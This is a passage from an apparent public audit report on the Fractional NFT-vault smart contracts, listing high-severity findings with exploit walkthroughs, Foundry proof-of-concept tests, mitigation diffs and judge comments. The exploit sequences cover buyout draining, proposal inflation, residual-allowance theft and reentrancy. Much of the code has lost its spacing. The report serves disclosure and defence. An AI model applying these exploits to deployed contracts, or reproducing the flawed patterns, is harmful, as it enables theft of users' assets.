+Attacker deploys a vault with10.000fractions minted51% of fractions (5.100) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5,980fractions each)With the first wallet, the attacker starts a buyout with10 ether- fractions are transferred into theBuyoutcontract as well as10 etherAttacker waits forREJECTION_PERIODto elapse to callBuyout.end(51% of fractions are already held in the contract, therefore no need for voting)After the successful buyout, the attacker uses theBuyout.cashfunction to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from theBuyoutcontract:Wallet 1 -buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether(totalSupply = 3920after burning980fractions from wallet 1)Wallet 2 -buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether(totalSupply = 2940after burning980fractions from wallet 2)Wallet 3 -buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether(totalSupply = 1960after burning980fractions from wallet 3)Wallet 4 -buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether(totalSupply = 980after burning980fractions from wallet 4)Wallet 5 -buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether(totalSupply = 0after burning980fractions from wallet 5)
+If summed up, cashing out the 5 wallets, the attacker receives22.8 etherin total. Making a profit of12.8 ether.
+This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in theBuyoutcontract.
+Recommended Mitigation Steps
+DecrementethBalancefrom buyout infobuyoutInfo[_vault].ethBalance -= buyoutShare;inBuyout.cash(see@audit-infoannotation):
+functioncash(address_vault,bytes32[]calldata_burnProof)external{// Reverts if address is not a registered vault(addresstoken,uint256id) =IVaultRegistry(registry).vaultToToken(_vault);if(id==0)revertNotVault(_vault);// Reverts if auction state is not successful(, ,Statecurrent, ,uint256ethBalance, ) =this.buyoutInfo(_vault);Staterequired=State.SUCCESS;if(current!=required)revertInvalidState(required,current);// Reverts if caller has a balance of zero fractional tokensuint256tokenBalance=IERC1155(token).balanceOf(msg.sender,id);if(tokenBalance==0)revertNoFractions();// Initializes vault transactionbytesmemorydata=abi.encodeCall(ISupply.burn,(msg.sender,tokenBalance));// Executes burn of fractional tokens from callerIVault(payable(_vault)).execute(supply,data,_burnProof);// Transfers buyout share amount to caller based on total supplyuint256totalSupply=IVaultRegistry(registry).totalSupply(_vault);uint256buyoutShare= (tokenBalance*ethBalance) /(totalSupply+tokenBalance);buyoutInfo[_vault].ethBalance-=buyoutShare;// @audit-info decrement `ethBalance` by `buyoutShare`_sendEthOrWeth(msg.sender,buyoutShare);// Emits event for cashing out of buyout poolemitCash(_vault,msg.sender,buyoutShare);}
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+When more than 1 user callsBuyout.cash, users will receive more ETH than expected - leaving a deficit so that later users are unable to access their funds. Agree this is a High risk issue.
+
+[H-09] Malicious User Could Burn The Assets After A Successful Migration
+Submitted by xiaoming90, also found by 0x52, cccz, codexploder, hyh, kenzo, Lambda, oyc_109, and zzzitron
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L334
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L358
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L383
+Background
+The following describes the migration process for a vault.
+Assume that Alice is the proposer.Alice callsMigration.proposeto propose a set of modules and plugins to migrate a vault toOther contributors could join a migration proposal by contributing ether and fractional tokens by callingMigration.join.Alice callsMigration.committo kick off the buyout process for a migration after the proposal period (7 days)If the buyout is successful, Alice calls theMigration.settleVaultto settle a migration. Within this function,  a new vault with new set permissions and plugins will be deployed.Alice calls theMigration.settleFractionsto mint the fractional tokens for a new vault.Contributors who earlier joined the migration proposal could call theMigration.migrateFractionsto migrate their fractional tokens from the old vault to the new vault.Finally, Alice will callMigration.migrateVaultERC20,Migration.migrateVaultERC721, and/orMigration.migrateVaultERC1155to transfer the ERC20, ERC721 (NFT), and/or ERC1155 tokens from the old vault to the new vault.
+Vulnerability Details
+It was observed that after a successful vault migration, an attacker couldMigration.migrateVaultERC20,Migration.migrateVaultERC721, and/orMigration.migrateVaultERC1155with an invalid_proposalIdparameter, causing the assets within the vault to be burned.
+Proof of Concept
+The PoC forMigration.migrateVaultERC20,Migration.migrateVaultERC721, and/orMigration.migrateVaultERC1155is the same. Thus, only the PoC forMigration.migrateVaultERC721is shown below, and the PoC formigrateVaultERC20andmigrateVaultERC1155are omitted for brevity.
+Assume that the following:
+vault Aholds only one (1) APE ERC721 NFTAlice proposes to migratevault Ato a new vault, and the buyout is successful.Alice proceeds to callMigration.settleVaultto settle a migration, followed byMigration.settleFractionsto mint the fractional tokens for a new vault.An attacker callsMigration.migrateVaultERC721(vault A, invalid_proposal_id, ape_nft_address, ape_nft_tokenId, erc721TransferProof)with an invalid proposal ID (proposal ID that does not exist).Within theMigration.migrateVaultERC721function, thenewVault = migrationInfo[_vault][_proposalId].newVaultwill evaluate to zero. This is because the_proposalIdis a non-existent index in themigrationInfoarray, so it will point to an address space that has not been initialised yet. Thus, the valuezerowill be returned, andnewVaultwill be set toaddress(0).Next, theMigration.migrateVaultERC721function will attempt to transfer the ERC721 NFT from the old vault (_vault) to the new vault (newVault) by callingIBuyout(buyout).withdrawERC721. SincenewVaultis set toaddress(0), this will cause the ERC721 NFT to be sent toaddress(0), which effectively burns the NFT.
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L358
+/// @notice Migrates an ERC-721 token to the new vault after a successful migration/// @param _vault Address of the vault/// @param _proposalId ID of the proposal/// @param _token Address of the ERC-721 token/// @param _tokenId ID of the token/// @param _erc721TransferProof Merkle proof for transferring an ERC-721 tokenfunctionmigrateVaultERC721(address_vault,uint256_proposalId,address_token,uint256_tokenId,bytes32[]calldata_erc721TransferProof)external{addressnewVault=migrationInfo[_vault][_proposalId].newVault;// Withdraws an ERC-721 token from the old vault and transfers to the new vaultIBuyout(buyout).withdrawERC721(_vault,_token,newVault,_tokenId,_erc721TransferProof);}
+Additional Note #1 - AboutBuyout.withdrawERC721
+When a user proposes a migration, the user will kick off the buyout process after the proposal period. TheMigrationmodule will initiate the buyout on behalf of the user. Thus, the proposer of this buyout, in this case, would be theMigrationmodule. WheneverBuyout.withdrawERC721function is called, it will verify thatmsg.senderis equal to theproposerto ensure that only the proposer who is the auction winner can migrate the assets from old vault to new vault.
+In this example, the attacker has access toMigration.migrateVaultERC20,Migration.migrateVaultERC721, and/orMigration.migrateVaultERC1155functions that effectively instruct theMigrationmodule to perform the withdrawal. In this case, it will pass theif (msg.sender != proposer) revert NotWinner();validation within theBuyout.withdrawERC721because themsg.senderis theMigrationcontract who initiates the buyout at the start.
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L343
+functionIBuyout(buyout).withdrawERC721(address_vault,address_token,address_to,uint256_tokenId,bytes32[]calldata_erc721TransferProof)external{// Reverts if address is not a registered vault(,uint256id) =IVaultRegistry(registry).vaultToToken(_vault);if(id==0)revertNotVault(_vault);// Reverts if auction state is not successful(,addressproposer,Statecurrent, , , ) =this.buyoutInfo(_vault);Staterequired=State.SUCCESS;if(current!=required)revertInvalidState(required,current);// Reverts if caller is not the auction winnerif(msg.sender!=proposer)revertNotWinner();// Initializes vault transactionbytesmemorydata=abi.encodeCall(ITransfer.ERC721TransferFrom,(_token,_vault,_to,_tokenId));// Executes transfer of ERC721 token to caller..SNIP..}
+Additional Note #2 - Can we send NFT to address(0)?
+Yes, it is possible to send NFT toaddress(0).
+If the ERC721 NFT contract usesOpenzeppelin’s ERC721 contractorSolmate’s ERC721 contract, then the NFT cannot be sent toaddress(0)because the contracts have implemented validation check to ensure that thetoaddress is notaddress(0).
+However, not all the ERC721 NFT contracts use Openzeppelin or Solmate ERC721 implementation. Therefore, there will be a large number of custom implementations that allow NFT to be transferred toaddress(0).
+The same theory applies to ERC20 and ERC1155 implementations.
+Impact
+Loss of assets for the users as the assets that they own can be burned by an attacker after a successful migration.
+Recommended Mitigation Steps
+It is recommended to implement additional validation to ensure that the_proposalIdsubmitted is valid.
+Consider checking ifnewVaultpoints to a valid vault address before transferring the assets from old vault to new vault.
+function migrateVaultERC721(address _vault,uint256 _proposalId,address _token,uint256 _tokenId,bytes32[] calldata _erc721TransferProof) external {address newVault = migrationInfo[_vault][_proposalId].newVault;+    if (newVault == address(0)) reverts VaultDoesNotExistOrInvalid;// Withdraws an ERC-721 token from the old vault and transfers to the new vaultIBuyout(buyout).withdrawERC721(_vault,_token,newVault,_tokenId,_erc721TransferProof);}
+In the above implementation, if anyone attempts to submit an invalid_proposalId, thenewVaultwill be set to address(0). The newly implemented validation will detect the abnormal behavior and revert the transaction.
+For defense-in-depth, perform additional validation to ensure that the_toaddress is notaddress(0)within theBuyout.withdrawERC721function.
+function withdrawERC721(address _vault,address _token,address _to,uint256 _tokenId,bytes32[] calldata _erc721TransferProof) external {// Reverts if address is not a registered vault(, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);if (id == 0) revert NotVault(_vault);+   if (_to == 0) revert ToAddressIsZero();// Reverts if auction state is not successful(, address proposer, State current, , , ) = this.buyoutInfo(_vault);State required = State.SUCCESS;if (current != required) revert InvalidState(required, current);// Reverts if caller is not the auction winnerif (msg.sender != proposer) revert NotWinner();// Initializes vault transactionbytes memory data = abi.encodeCall(ITransfer.ERC721TransferFrom,(_token, _vault, _to, _tokenId));// Executes transfer of ERC721 token to callerIVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);}
+The same validation checks should be implemented onmigrateVaultERC20,migrateVaultERC1155,withdrawERC20andwithdrawERC1155
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+migrateVaultERC20could transfer assets to address(0). ERC721 and 1155 standards require revert when to is address(0), but this is not required by the ERC20 standard. This could be triggered by calling migrate with an invalidproposalId. Agree this is a High risk issue.Selecting this submission as the primary report for clearly outlining the potential high risk scenario here.
+
+[H-10] Steal NFTs from a Vault, and ETH + Fractional tokens from users.
+Submitted by infosec_us_team, also found by 0x29A, 0xsanson, berndartmueller, BowTiedWardens, Lambda, MEP, panprog, PwnedNoMore, shenwilly, smiling_heretic, Treasure-Seeker, TrungOre, xiaoming90, and zzzitron
+Steal NFTs from a Vault, and ETH + Fractional tokens from users.
+Description
+TheMigration.solmodule expects users to join a proposal using thejoinfunction, and leave a proposal using theleavefunction, both functions update fraction and ether balances of the proposalandthe caller.
+ThewithdrawContributionfunction is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.
+Unfortunately, thewithdrawContributionfunction will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variablestotalEthandtotalFractions(asjoinandleavedo), leading to an inflation of ETH and fractional tokens if the user callsjoin,withdrawContributionandjoinagain.
+Exploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:
+1- Lack of funds (they were stolen).
+2- Only 1 LIVE proposal can be running at the same time.
+A key element to take note is that only 1 proposal can beLIVE, but before a proposal goesLIVE, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.
+Steps to reproduce
+An attacker will exploit the inflation bug as follows:
+1- Wait until there’s at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.
+2- Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.
+3- Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal andstartit.
+Now that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things can be done, including taking over the Vault’s NFTs with an evil module once the proposal goes through.
+NOTE: In theREJECTION_PERIODvictims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using thedepositAmountandmsg.value(https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker.
+Proof of Concept
+The proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproducible PoC that illustrates the impact of the attack.
+Everything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.
+You can read the PoC or include the function intest/Migration.t.soland callforge test -vvv --match-test testProposalAttackto execute it.
+function testProposalAttack() public {initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();address[] memory modules = new address[](1);modules[0] = address(mockModule);// STEP 0// The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made// STEP 1// Alice makes a legit proposalalice.migrationModule.propose(vault,modules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,1 ether);// STEP 3// Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);// NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,// but to make this PoC easier to read, instead of creating several fake accounts,// let's have just Alice join his own proposal with 50% of token supply.// STEP 4// Bob makes an evil proposal, with evil modules to steal the vault's NFTsbob.migrationModule.propose(vault,modules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY,1 ether);// STEP 5// Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal// and total locked tokens (thanks to a bug in the `withdrawContribution` function)bob.migrationModule.join{value: 10 ether}(vault, 2, 25);bob.migrationModule.withdrawContribution(vault, 2);bob.migrationModule.join{value: 10 ether}(vault, 2, 25);bob.migrationModule.withdrawContribution(vault, 2);bob.migrationModule.join{value: 10 ether}(vault, 2, 25);bob.migrationModule.withdrawContribution(vault, 2);bob.migrationModule.join{value: 10 ether}(vault, 2, 24);bob.migrationModule.withdrawContribution(vault, 2);bob.migrationModule.join{value: 10 ether}(vault, 2, 101);// Let's do some accounting...(,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);(,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);// Alice proposal has 50 ETH.assertEq(totalEth_AliceProposal, 50000000000000000000);// Bob's proposal has 50 ETH.assertEq(totalEth_BobProposal, 50000000000000000000);// He only put 10 ETH, but it shows 50 ETH because// we inflate it by exploiting the bug.// We can keep inflating it indefinitely to get any ETH// amount desired (up to the max ETH balance of the smart contract).// NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.// We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.// STEP 6// Bob calls commit to kickoff the buyout processbool started = bob.migrationModule.commit(vault, 2);assertTrue(started);// Final accounting:// Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,// exactly what is required to win a proposal)assertEq(getFractionBalance(buyout), 5101);// and 50 ETH from Alice's proposalassertEq(getETHBalance(buyout), 50 ether);// Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 etherassertEq(getETHBalance(bob.addr), 90 ether);// Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen// from Alice's proposalassertEq(getFractionBalance(bob.addr), 4899);// Next steps are straight forward, you can get creative and do many things that would make the PoC// unnecessarily long// Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE// at the same time. Also, there's not enough ETH in the contract to commit his proposal,// We are using all of his ETH in our own proposal.
+Tools Used
+Runforge test -vvv --match-test testProposalAttackafter preparing the testing environment as explainedhere.
+Recommended Mitigation Steps
+Update theproposal.totalEthandproposal.totalFractionsin thewithdrawContributionfunction.
+Ferret-san (Fractional) confirmed
+HardlyDifficult (judge) commented:
+This is a very detailed report! Agree this is a High risk finding.
+
+[H-11] Users can lose fractions to precision loss during migraction if _newFractionSupply is set very low
+Submitted by 0x52, also found by 0x29A, hansfriese, and MEP
+Precision loss causing loss of user value and potentially cause complete loss to vault.
+Proof of Concept
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L471-L472
+If the supply of the fraction is set to say 10 then any user that usesmigrateFractionswith less than 10% of the contributions will receive no shares at all due to precision loss. Under certain conditions it may even cause complete loss of access to the vault. In this same example, if less than 5 fractions can be redeemed (i.e. not enough people have more than 10% to overcome the precision loss) then the vault would never be able to be bought out and the vault would forever be frozen.
+Recommended Mitigation Steps
+When calling propose require that\_newFractionSupplyis greater than some value (i.e. 1E18).
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+Rounding can lead to loss of assets. Agree with severity.
+
+[H-12] Malicious Users Can Exploit Residual Allowance To Steal Assets
+Submitted by xiaoming90, also found by 0x29A, 0xalpharush, 0xDjango, ayeslick, Critical, infosec_us_team, and Treasure-Seeker
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91
+Vulnerability Details
+A depositor cannot have any residual allowance after depositing to the vault because the tokens can be stolen by anyone.
+Proof of Concept
+Assume that Alice has finished deploying the vault, and she would like to deposit her ERC20, ERC721, and ERC1155 tokens to the vault. She currently holds the following assets in her wallet
+1000XYZ ERC20 tokensAPE #1 ERC721 NFT, APE #2 ERC721 NFT, APE #3 ERC721 NFT,1000ABC ERC1155 tokens
+Thus, she sets up the necessary approval to grantbaseVaultcontract the permission to transfer her tokens to the vault.
+erc20.approve(address(baseVault),type(uint256).max);erc721.setApprovalForAll(address(baseVault),true);erc1155.setApprovalForAll(address(baseVault),true);
+Alice decided to deposit50XYZ ERC20 tokens, APE #1 ERC721 NFT, and50ABC tokens to the vault by callingbaseVault.batchDepositERC20,baseVault.batchDepositERC721, andbaseVault.batchDepositERC1155as shown below:
+baseVault.batchDepositERC20(alice.addr,vault, [XYZ.addr], [50])baseVault.batchDepositERC721(alice.addr,vault, [APE.addr], [#1])baseVault.batchDepositERC1155(alice.addr,vault, [ABC.addr], [#1], [50],"")
+An attacker notices that there is residual allowance left on thebaseVault, thus the attacker executes the following transactions to steal Alice’s assets and send them to the attacker’s wallet address.
+baseVault.batchDepositERC20(alice.addr,attacker.addr, [XYZ.addr], [950])baseVault.batchDepositERC721(alice.addr,attacker.addr, [APE.addr,APE.addr], [#2, #3])baseVault.batchDepositERC1155(alice.addr,attacker.addr, [ABC.addr], [#1], [950],"")
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58
+functionbatchDepositERC20(address_from,address_to,address[]calldata_tokens,uint256[]calldata_amounts)external{for(uint256i=0;i<_tokens.length; ) {IERC20(_tokens[i]).transferFrom(_from,_to,_amounts[i]);unchecked{++i;}}}
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77
+functionbatchDepositERC721(address_from,address_to,address[]calldata_tokens,uint256[]calldata_ids)external{for(uint256i=0;i<_tokens.length; ) {IERC721(_tokens[i]).safeTransferFrom(_from,_to,_ids[i]);unchecked{++i;}}}
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91
+functionbatchDepositERC1155(address_from,address_to,address[]calldata_tokens,uint256[]calldata_ids,uint256[]calldata_amounts,bytes[]calldata_datas)external{unchecked{for(uint256i=0;i<_tokens.length; ++i) {IERC1155(_tokens[i]).safeTransferFrom(_from,_to,_ids[i],_amounts[i],_datas[i]);}}}
+Impact
+Loss of assets for users as a malicious user could utilise thebaseVaultcontract to exploit the user’s residual allowance to steal their assets.
+Recommended Mitigation Steps
+It is recommended to only allow thebaseVault.batchDepositERC20,baseVault.batchDepositERC721, andbaseVault.batchDepositERC1155functions to pull tokens from the caller (msg.sender).
+Considering updating the affected functions to remove thefromparameter, and usemsg.senderinstead.
+function batchDepositERC20(-   address _from,address _to,address[] calldata _tokens,uint256[] calldata _amounts) external {for (uint256 i = 0; i < _tokens.length; ) {-       IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);+       IERC20(_tokens[i]).transferFrom(msg.sender, _to, _amounts[i]);unchecked {++i;}}}
+function batchDepositERC721(-   address _from,address _to,address[] calldata _tokens,uint256[] calldata _ids) external {for (uint256 i = 0; i < _tokens.length; ) {-       IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);+       IERC721(_tokens[i]).safeTransferFrom(msg.sender, _to, _ids[i]);unchecked {++i;}}}
+function batchDepositERC1155(-   address _from,address _to,address[] calldata _tokens,uint256[] calldata _ids,uint256[] calldata _amounts,bytes[] calldata _datas) external {unchecked {for (uint256 i = 0; i < _tokens.length; ++i) {IERC1155(_tokens[i]).safeTransferFrom(-               _from,+               msg.sender,_to,_ids[i],_amounts[i],_datas[i]);}}}
+stevennevins (Fractional) confirmed and commented:
+Confirmed, we will be addressing this issue!
+HardlyDifficult (judge) commented:
+Anyone who approved the BaseVault can have their tokens stolen. Agree this is high risk.
+
+[H-13] Migration Module: Re-entercommitusing custom token
+Submitted by zzzitron, also found by 0x29A
+HIGH - Assets can be compromised directly.
+One can drain eth out from migration module to buyout module using custom made FERC1155 token.
+Proof of Concept
+Proof of Concept:testCommitReenter_pocCustom made FERC1155 for the attack
+The proof of concept shows a scenario where Alice is draining migration module using custom made FERC1155 token.
+Setup: other people are using migration module and they deposited some eth. (using Alice and Bob just to simplify the set up process)Alice prepared the custom FERC1155 (let’s sayevil_token)Alice create a vault with theevil_tokenAlice proposes and joins with 0.5 etherWhen Alice callscommit, theevil_tokenwill reentercommitand send money to buyout module
+Note: For simplicity, theevil_tokenreenters for a fixed number of times. But one can adjust to drain all the eth in the migration module.
+Note2: For now the eth is in the buyout module, but given the current implementation ofbuyoutmodule, the same actor can drain eth from buyout.
+Thecommitfunction is not written in Checks, Effects, Interactions (CEI) patterns.
+// modules/Migration.sol::commit// proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor)// Mitigation idea: set the values before the out going calls206if(currentPrice>proposal.targetPrice) {207// Sets token approval to the buyout contract208IFERC1155(token).setApprovalFor(address(buyout),id,true);209// Starts the buyout process210IBuyout(buyout).start{value:proposal.totalEth}(_vault);211proposal.isCommited=true;212started=true;213}
+Tools Used
+Foundry
+Recommended Mitigation Steps
+Follow Checks, Effects, Interactions patterns. One can also consider adding reentrancy guard.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+The 1155 callback could be used to reentrancy and steal funds. Agree this is high risk.
+
+[H-14] Fund will be stuck if a buyout is started while there are pending migration proposals
+Submitted by shenwilly, also found by 0x52, codexploder, dipp, kenzo, Lambda, MEP, panprog, smiling_heretic, Treasure-Seeker, TrungOre, xiaoming90, and zzzitron
+Funds in migration proposals could potentially be stuck forever if a buyout auction on the same vault is started by other party.
+Most of the functions withinMigration.solcan only be executed depending on the state of buyout auction inBuyout.sol. When there is no buyout happening, a migration proposal can be made and anyone can contribute to the proposal. However, it is possible that a buyout auction is started by another party while a pending proposal is not commited yet.
+When this scenario happens, there is no action that could be taken to interact with the pending proposal. All funds that have been contributed cannot be withdrawn. This is because the functions only check for the state of the buyout auction, instead of also considering whether the buyout auction’s proposer isMigration.sol:
+(address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);if (id == 0) revert NotVault(_vault);// Reverts if buyout state is not inactive(, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);State required = State.INACTIVE;if (current != required) revert IBuyout.InvalidState(required, current);
+Proposal contributors have to wait until the buyout failed before they can withdraw their funds. In case the buyout succeeded, their funds will be stuck forever.
+Proof of Concept
+Bob made a migration proposal and contributed0.5 eth.Alice individually started a buyout auction. Buyout state is nowACTIVE.Bob can’t leave the proposal.Alice successfully ended the buyout auction. Buyout state is nowSUCCESS.Bob can’t withdraw the funds.
+Below are the test cases that show the scenarios described above.
+function testLeaveBuyoutStarted() public {initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();// Migrate to a vault with no permissions (just to test out migration)address[] memory modules = new address[](1);modules[0] = address(mockModule);// Bob makes the proposalbob.migrationModule.propose(vault,modules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,1 ether);// Bob joins the proposalbob.migrationModule.join{value: 0.5 ether}(vault, 1, HALF_SUPPLY);// Alice started buyoutalice.buyoutModule.start{value: 1 ether}(vault);(, , State current, , , ) = alice.buyoutModule.buyoutInfo(vault);assert(current == State.LIVE);vm.expectRevert(abi.encodeWithSelector(IBuyout.InvalidState.selector, 0, 1));// Bob cannot leavebob.migrationModule.leave(vault, 1);}function testLeaveBuyoutSuccess() public {// Send Bob a smaller amount so Alice can win the auctioninitializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY/2, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();// Migrate to a vault with no permissions (just to test out migration)address[] memory modules = new address[](1);modules[0] = address(mockModule);// Bob makes the proposalbob.migrationModule.propose(vault,modules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,1 ether);// Bob joins the proposalbob.migrationModule.join{value: 0.5 ether}(vault, 1, HALF_SUPPLY/2);// Alice did a buyoutalice.buyoutModule.start{value: 1 ether}(vault);vm.warp(rejectionPeriod + 1);alice.buyoutModule.end(vault, burnProof);(, , State current, , , ) = alice.buyoutModule.buyoutInfo(vault);assert(current == State.SUCCESS);vm.expectRevert(abi.encodeWithSelector(IBuyout.InvalidState.selector, 0, 2));// Bob cannot leavebob.migrationModule.leave(vault, 1);}
+Recommended Mitigation Steps
+Modify the checks for the following functions:
+leavewithdrawContribution
+So users can withdraw their funds from the proposal when the buyout auction proposer is notMigration.sol.
+In addition, it’s also possible that there are multiple ongoing proposals on the same vault and the buyout is started by one of them. To allow other proposals’ contributors to withdraw their fund, consider tracking the latestproposalIdthat started the buyout on a vault:
+mapping(address => uint256) public latestCommit;function commit(address _vault, uint256 _proposalId) {...if (currentPrice > proposal.targetPrice) {...latestCommit[_vault] = _proposalId;}}
+Forleave:
+(, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);// if buyout is started by this proposal, check that state is inactive. Else allow leaving.if (proposer == address(this) && latestCommit[_vault] == _proposalId) {State required = State.INACTIVE;if (current != required) revert IBuyout.InvalidState(required, current);}
+ForwithdrawContribution:
+(, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);// if buyout is started by this proposal, check that state is inactive. Else allow withdrawing.if (proposer == address(this) && latestCommit[_vault] == _proposalId) {State required = State.INACTIVE;if (current != required) revert IBuyout.InvalidState(required, current);}if (migrationInfo[_vault][_proposalId].newVault != address(0)) revert NoContributionToWithdraw();
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+Starting a buyout can cause migration funds to become stuck in the contract. Agree this is High risk.Selecting this submission as the primary for including POC code and including clear recs.
+
+[H-15] Failed proposal can be committed again
+Submitted by 0x52, also found by hansfriese
+Failed proposal can be committed again and eth stolen from migration contract in combination with other vulnerabilities submitted.
+Proof of Concept
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L194
+Commit can be called as long as it has been less than 7 days from the start time. The buyout period is specified as 4 days in the buyout contract. This means that as long as proposal is committed within 3 days of starting, commit can be called again after a failed buyout (4 days) because the current time will still be less than 7 days from the start time.
+This can be used in combination with a vulnerability I previously reported. The contract does not account for the actual number of fractions that it receives back from a failed buyout. If it sent 10 fractions and 3 eth to a buyout it may receive back 15 fractions and 2 eth due to trading against the buyout. Because commit can called again on the same proposal, the second time it will try to send the fraction balance of the contract, now 15, and the value of the eth in the proposal, 3 eth. This transaction will either revert due to not having enough eth or it will send 3 eth pulling from eth deposited to other migration proposals.
+This could be exploited by creating a vault and immediately migrating it. Once the migration starts the user could sell fractions to themselves and get eth, making sure to keep the number of fractions under 51%, to prevent a successful buyout. After the buyout fails they can then call the commit function again and more eth will be sent. They can then sell fractions to themselves netting more eth than they initially supplied. This could be done repeatedly until all eth has been stolen from the migration contract.
+Recommended Mitigation Steps
+Change the length of either the migration period or the buyout period to match so that a proposal can’t be replayed.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+Committing a failed proposal multiple times can steal funds from the migration contract. Agree this is High risk.Making this submission the primary for talking through the potential vulnerability here.
+
+[H-16]migrateFractionsmay be called more than once by the same user which may lead to loss of tokens for other users
+Submitted by dipp, also found by 0x52, ak1, auditor0517, hansfriese, jonatascm, kenzo, Lambda, panprog, PwnedNoMore, Ruhum, smiling_heretic, Treasure-Seeker, and xiaoming90
+ThemigrateFractionsfunction in theMigration.solcontract is used to send new vault tokens to the user calculated based on the amount of ETH and fractions the user contributed to the migration proposal. After it is called once the user should have all the new vault tokens owed to them.
+Since the function does not check if the user had already called it, a user may call it more than once, allowing them to gain more new vault tokens than they are owed. If a user repeatedly uses this function to gain new tokens then other users may not be able to get their new tokens.
+Proof of Concept
+Test code added toMigrations.t.sol:
